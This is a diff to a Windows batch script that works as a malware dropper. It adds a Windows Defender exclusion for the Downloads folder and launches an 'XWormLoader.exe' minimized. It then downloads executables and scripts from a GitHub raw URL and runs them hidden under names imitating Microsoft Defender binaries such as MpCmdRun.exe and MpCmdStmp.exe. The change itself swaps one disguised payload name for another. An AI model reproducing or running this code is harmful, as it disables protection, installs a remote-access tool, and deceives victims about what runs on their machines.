@@ -8,13 +8,13 @@ powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
 start /min "" "XWormLoader.exe"
 
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/msedge.exe' -OutFile '%USERPROFILE%\AppData\Roaming\msedgpe.exe'"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdStmp.exe' -OutFile '%USERPROFILE%\AppData\Roaming\MpCmdStmp.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\run.bat'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/cmd.ps1' -OutFile '%USERPROFILE%\cmd.ps1'"
 
 cd "%USERPROFILE%\AppData\Roaming\"
-start /min "" "msedgpe.exe"
+start /min "" "MpCmdStmp.exe"
 
 cd "%USERPROFILE%
 start /min "" "run.bat"
